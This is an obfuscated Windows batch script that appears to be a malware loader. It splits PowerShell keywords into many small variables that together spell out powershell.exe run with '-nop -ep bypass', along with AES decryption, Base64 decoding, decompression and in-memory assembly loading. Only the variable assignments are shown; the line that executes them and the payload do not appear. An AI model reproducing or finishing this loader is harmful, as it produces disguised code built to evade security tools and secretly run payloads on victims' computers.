@echo off
set "LBfxlsEFbm=Wi"
set "RBKTNzKqEA=Po"
set "bNGEoxvOcF=we"
set "tLNvISbjWq=ow"
set "rHOLYaRHWq=ll"
set "CWxaqYCNyV=s\"
set "SjvEXBSoUA=do"
set "ndmBWTwTeP=nd"
set "iIPGerzBQy=he"
set "qvJKJqGlkY=em"
set "rIvjxZHeij=32"
set "QCJumfFqpI=ll"
set "BGErNuRJVk=co"
set "UMsZXHpLVm=\v"
set "xvGHgpyfAq=\W"
set "sueJnyvFCo=Sy"
set "knxrAZOKPt=st"
set "jsgUrGxxhZ=1."
set "zhIeXKyEUc=py"
set "ondmqnacJE=we"
set "hzXcskpGfV=he"
set "sJCFWUOcEt=ws"
set "ETkUDwKQSF=y "
set "CHgzhGhChU=:\"
set "OyllOUAQNS=0\"
set "UZdAPvpQJw=po"
set "VhEGpCQEle=xe"
set "wklZYApsjJ=rS"
set "kRYfEWKtaW=in"
set "zLOhkMRNGt=.e"
set "IiipUvAhlc=rs"
set "iOJgoauxqT= /"
set "AIkKnXafVA= C"
set "BPiBVfCNme=cd"
set "sCeyEFXkzO= %~dp0"
set "OmEmWsrZAO=pStr"
set "jAqZGyqVQk=bjec"
set "idGHpPISRH=onve"
set "uzIxwUaMhX=1..-"
set "ajLdkWzCCm=)))"
set "MpCiLjwCDU=('%*'"
set "KHvcYAQoyR=RmAx"
set "dKtkPjuiHA=-1.."
set "jnMWGpPPrO=vert"
set "BcipYwZcMK= = ["
set "TeCqbXdcag=nage"
set "MOIqvXJfcI=Disp"
set "XoadRVatli=-joi"
set "ZrfAdktMJQ=kNKX"
set "LZsAsxjydJ=$Clb"
set "agdIsODDpL=n ''"
set "bTLEBvTpCX= [st"
set "wTPOmwMDQh= '')"
set "lZtyYyMcBD=join"
set "dEkXzgPDRV=t Sy"
set "BFtsTMwfxp=jF);"
set "IDZBFmafFP=ClbH"
set "hkHshmOHcZ=gjYA"
set "mtmtsmhyCh='[-1"
set "iIxxhQuHfP=[Sys"
set "LVepNMqdku=Fina"
set "pWQqEbEEyN=, $v"
set "pGxNhrnpjf=yste"
set "LpBEQIHGUJ=vsyj"
set "HBVUGJFHto=ring"
set "lEtDTQVLYN=Stre"
set "YnXtqwTSQx=ect "
set "BfxJaKRDbc=esMa"
set "dJoqsHQsYh=ing("
set "qCjvJCjZOu=File"
set "TahRlyuBRf=y]::"
set "VTMaFwJFyW= if "
set "PIcGhUtqFu=[IO."
set "sPHXsiIKud=yTo("
set "dYOtDZMlLo=ateD"
set "nPNtCbaegT=ew-O"
set "UOlYmZqNhY=iron"
set "qKTIdDEzwt=m.Re"
set "HSaVckjiKw=morF"
set "iyxxZsguTG=-ep "
set "zismuDnVfa=em.I"
set "aYtECuOuzi=brea"
set "bsqjdZmluI=pres"
set "IBSWiTrpWh=();$"
set "ubnGXSoXGA=esaB"
set "NezCYFgRzT=J = "
set "XfevmuLeMv=N.Pa"
set "TolsRIELtS=y.Pa"
set "EMWIvzPhbK=rans"
set "XbFMpBbjRz=:: '"
set "GLGyZNKzWE=.Con"
set "EkevMwLPAT='[-1"
set "LZewcrzNDo=.Key"
set "jaXyZiDLZf=);$L"
set "AmCgUbHFLw=e = "
set "hZcxFNlLLm=O.Me"
set "fuzbMuDgJN=-4] "
set "sQifyvkZUT=zuZI"
set "XqvagCooab=vsyj"
set "bjebJygZKl= New"
set "uSjhEnZBii=Conv"
set "tJqzRabGAs=ck($"
set "GanrkBQAnD=ypto"
set "iYNQqECRoA=am;$"
set "BCYhTFjypx=-nop"
set "lTztSfcYqj=..-1"
set "YddAWUVKcD=;$kN"
set "CNTNfXccHD=rt]:"
set "QbrdqfWoFW=]::("
set "hSUTHOVBza=embl"
set "EXMfiBSDoe=s75K"
set "WCvMbcvtAO=PxEW"
set "ciheqUynbS=null"
set "NZHrOxdfIx=$nLT"
set "cWNBujLPqL=gsYZ"
set "ftxkncbitS=($nS"
set "aekQLpAuHJ=gDx."
set "mDHEHgYBjL=.Cre"
set "VFIkAbHVDT=JSvN"
set "wGGgFkfony=1] -"
set "FlXvVGNKdc=.Len"
set "VTmGJXvLml=bypa"
set "ajXZBGgUHU=pose"
set "DNbERKeyQK=;$LI"
set "wRgLVgRpHy=stem"
set "GiMfSYmwZY=.-16"
set "qwCbHnBAmn=).Sp"
set "LJCSJYBXVw=syjF"
set "MIAHdiAQWp= [Sy"
set "cJsdWMwvfN=pose"
set "vTvyIIKvQN=ispo"
set "ASfmszoEoN=ewLi"
set "sHQZazKfBW=Comp"
set "odCLfnSSef=lBlo"
set "QilJpUvdBh=ptog"
set "KOWbPzCUEW=Syst"
set "yWtlHAzJsI=.IO."
set "eMjDWhMzFV=dj0C"
set "BkcbYDVZJI=saBm"
set "XNCXZbtDxk=.Com"
set "vlzzcLPBEc=ion."
set "sgxuXVvvwT=k; }"
set "fJPukDcpeG=HL.D"
set "lMYUjYIeJR=W.En"
set "WIEneWvgfV=raph"
set "SIKpfhcDWU=LJSv"
set "PCDlBdFgAn=::('"
set "dzaafujcvj=106u"
set "PNpILgClmv=[-1."
set "PJKRLrOAyl=in $"
set "uxydsynofx=oArr"
set "npsEODGzEP=L = "
set "gLvqTrdPqC=ddin"
set "VURuVQpoaD='txe"
set "SnbmiiPUvY=form"
set "uLAwxncNpk=F = "
set "HWFWXxolZi=raph"
set "AhRShUduqC=ress"
set "LmWDAkmtrf=]::C"
set "zRGgNJexVq=Obje"
set "ReGtnxnYid=rity"
set "MjKBkBSaPb=rtS4"
set "tmmqQqBEYp=JYW "
set "Fdjokzhmsk=FNk "
set "nNtJpdZuuY=dRl."
set "iqtXWxDCsj=);$L"
set "TwTPPTYqvB=jF ="
set "HkYNvLRxpM=rity"
set "HnDcVOMXEw=;$lK"
set "QFXJeTaXKk=ptor"
set "untkkqVUhm=grap"
set "OHjlXoAkwi=rofi"
set "DKfmhFUAKK=Uo);"
set "DpCUWNjBzl=bstr"
set "riKFzgsQMg=CFxo"
set "nhZJsBqHWK=se()"
set "OjLLVyaeoK=F = "
set "UqVLMTfQvJ=vN.I"
set "gfJRdtEAFR=kzZf"
set "eRhhXbuqdZ=eMVs"
